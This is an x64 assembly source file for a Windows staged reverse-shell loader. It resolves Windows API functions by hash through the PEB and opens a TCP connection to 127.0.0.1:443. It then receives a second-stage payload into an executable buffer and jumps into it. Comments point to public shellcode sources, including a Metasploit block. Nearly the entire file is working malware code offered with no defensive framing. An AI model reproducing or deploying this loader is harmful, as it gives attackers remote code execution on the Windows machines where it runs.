.CODE

ALIGN 16

revshell PROC
; https://raw.githubusercontent.com/V-i-x-x/Assembly-Shellcode64/refs/heads/main/Shellcode64/Shellcode.asm
		start:
		sub rsp, 1000h
		mov r15, rsp					; copy stack pointer to r15 register

	; Parse PEB and find kernel32
	find_kernel32:   
		xor rcx, rcx					; RCX = 0
		mov rsi, gs:[rcx + 60h]			; RAX = PEB
		mov rsi, [rsi + 18h]			; RAX = PEB->Ldr
		mov rsi, [rsi + 30h]			; RSI = PEB->Ldr.InMemOrder
		mov dl, 4bh

    next_module:
		mov rbx, [rsi + 10h]			; EBX = InInitOrder[X].base_address
		mov rdi, [rsi + 40h]			; EDI = InInitOrder[X].module_name
		mov rsi, [rsi]					; ESI = InInitOrder[X].flink (next)
		cmp [rdi + 12*2], cx			; (unicode) modulename[12] == 0x00 ?
		jne next_module					; No: try next module
		cmp [rdi], dl					; modulename starts with "K"
		jne next_module					; No: try next module

	find_function_shorten:
		jmp find_function_shorten_bnc   ; Short jump

	find_function_ret:
		pop rsi                         ; POP the return address from the stack
		mov [r15 + 80h], rsi			; Save find_function address for later usage
		jmp resolve_symbols_kernel32    ; resolve functions inside kernel32 dll

	find_function_shorten_bnc:
		call find_function_ret          ; Relative CALL with negative offset

    find_function:
		push rax
		xor rax, rax
        mov eax, [rbx + 3ch]			; Offset to PE Signature
		add rax, 88h
		xor rdi, rdi
        mov edi, [rbx + rax]			; Export Table Directory RVA
        add rdi, rbx					; Export Table Directory VMA
        mov ecx, [rdi + 18h]			; NumberOfNames
        mov eax, [rdi + 20h]			; AddressOfNames RVA
        add rax, rbx					; AddressOfNames VMA
        mov [r15 + 88h], rax			; Save AddressOfNames VMA for later

	find_function_loop:
		jecxz find_function_finished    ; Jump to the end if ECX is 0
		dec rcx							; Decrement our names counter
		mov rax, [r15 + 88h]			; Restore AddressOfNames VMA
		xor rsi, rsi
		mov esi, [rax + rcx * 4]		; Get the RVA of the symbol name
		add rsi, rbx					; Set ESI to the VMA of the current symbol name
		

	compute_hash:
		xor rax , rax					; NULL EAX
		xor r9, r9						; NULL EDX
		cld                             ; Clear direction

	compute_hash_again:
		lodsb                           ; Load the next byte from esi into al
		test al, al						; Check for NULL terminator
		jz compute_hash_finished		; If the ZF is set, we've hit the NULL term
		ror r9d, 0dh					; Rotate edx 13 bits to the right
		add r9, rax						; Add the new byte to the accumulator
		jmp compute_hash_again			; Next iteration

	compute_hash_finished:
	; print hash


	find_function_compare:
		cmp r9, [rsp + 10h]				; Compare the computed hash with the requested hash
		jnz find_function_loop			; If it doesn't match go back to find_function_loop
		xor rdx, rdx
		mov edx, [rdi + 24h]			; AddressOfNameOrdinals RVA
		add rdx, rbx					; AddressOfNameOrdinals VMA
		mov cx,  [rdx + 2 * rcx]		; Extrapolate the function's ordinal
		mov edx, [rdi + 1ch]			; AddressOfFunctions RVA
		add rdx, rbx					; AddressOfFunctions 
		xor eax, eax
		mov eax, [rdx + 4 * rcx]		; Get the function RVA
		add rax, rbx					; Get the function VMA
		mov [rsp], rax					; Save

	find_function_finished:
		pop rax
		ret

	resolve_symbols_kernel32:
		xor r14, r14
		mov r14d, 91afca54h				; VirtualAlloc hash
		push r14
		call qword ptr [r15 + 80h]
		mov [r15 + 90h], rax			; Save VirtualAlloc address for later usage
		xor r14, r14
		mov r14d, 0ec0e4e8eh			; LoadLibraryA hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 98h], rax			; Save LoadLibraryA address for later usage
		xor r14, r14
		mov r14d, 16b3fe72h				; CreateProcessA hash
		push  r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 100h], rax			; Save CreateProcessA address for later usage

	
	load_ws2_32:
		mov   rcx, 642e32335f327377h	; Push another part of the string on the stack
		mov  [r15 + 108h], rcx			; put string in stack
		mov rcx, 6c6ch					;
		mov  [r15 + 110h], rcx			; put null in stack
		lea rcx, [r15 + 108h]			; save address of the string in rcx
		mov rax, [r15 + 98h]			;
		call rax						; Call LoadLibraryA

	resolve_symbols_ws2_32:
		mov rbx, rax					; Move the base address of ws2_32.dll to RBX
		xor r14, r14
		mov r14d, 3bfcedcbh				; WSAStartup hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 118h], rax			; Save WSAStartup address for later usage
		
		xor r14, r14
		mov r14d, 0e71819b6h 			; recv hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov [r15 + 130h], rax			; Save recv address for later usage
		pop r14 
		
		xor r14, r14
		mov r14d, 0adf509d9h			; WSASocketA hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 120h], rax			; Save WSASocketA address for later usage
		xor r14, r14
		mov r14d, 0b32dba0ch			; WSAConnect hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 128h], rax			; Save WSAConnect address for later usage

	call_wsastartup:
		pop rbx
		mov rcx, 202h					; wVersionRequired
		lea rdx, [r15 + 300h]			; lpWSAData structure
		mov rax, [r15 + 118h]			; WSAStartup Saved Address 
		call rax

	call_wsasocketa:
		mov ecx, 2						; af
		mov rdx, 1						; type
		mov r8, 6						; IPPROTO_TCP
		xor r9, r9						; lpProtocolInfo
		mov [rsp+20h], r9				; g
		mov [rsp+28h], r9				; dwFlags
		mov rax, [r15 + 120h]			; WSASocketA Saved Address 
		call rax
		mov rsi, rax					; save socket handle in rsi

	call_connect:
		mov rcx, rax					; pointer to the socket
		mov r8, 10h						; namelen argument = 10
		lea rdx, [r15 + 300h]			; pointer to sockaddr_in
		mov r9, 0100007fbb01h			; sin_addr (127.0.0.1) + sin_port (443)
		mov [rdx + 2], r9				; write above to stack
		xor r9,r9						;
		inc r9d							;
		inc r9d							;  0x02 (AF_INET)
		shl r9d, 10h					; shift left so it can be 00000200
		mov [rdx - 2], r9d
		xor r9, r9
		mov [rdx + 8], r9				; add array of 0
		mov rax, [r15 + 128h]           ; WSAConnect
		call rax

; https://raw.githubusercontent.com/rapid7/metasploit-framework/refs/heads/master/external/source/shellcode/windows/x64/src/block/block_recv.asm

	recv:
		; Receive the size of the incoming second stage...
		sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
		mov rdx, rsp           ; set pointer to this buffer
		xor r9, r9             ; flags
		push 4                 ; 
		pop r8                 ; length = sizeof( DWORD );
		mov r12, rsi
		mov rcx, rsi           ; the saved socket
		mov rax, [r15 + 130h]  ;
		call rax               ; recv( s, &dwLength, 4, 0 );

		; Alloc a RWX buffer for the second stage
		pop rsi
		mov esi, esi           ; only use the lower-order 32 bits for the size
		push 40h               ; 
		pop r9                 ; PAGE_EXECUTE_READWRITE
		push 1000h             ; 
		pop r8                 ; MEM_COMMIT
		mov rdx, rsi           ; the newly recieved second stage length.
		xor rcx, rcx           ; don't care about the location
		mov rax, [r15 + 90h]   ; load VirtualAlloc
		call rax               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		; Receive the second stage and execute it...
		mov rbx, rax           ; rbx = our new memory address for the new stage
		mov r13, rax           ; save the address so we can jump into it later
	
	read_more:                 ;
		xor r9, r9             ; flags
		mov r8, rsi            ; length
		mov rdx, rbx           ; the current address into our second stages RWX buffer
		mov rcx, r12		   ; socket
		mov rax, [r15 + 130h]  ;
		call rax               ; recv( s, &dwLength, 4, 0 );
		add rbx, rax           ; buffer += bytes_received
		sub rsi, rax           ; length -= bytes_received
		test rsi, rsi          ; test length
		jnz read_more          ; continue if we have more to read
		jmp r13                ; return into the second stage

revshell ENDP

END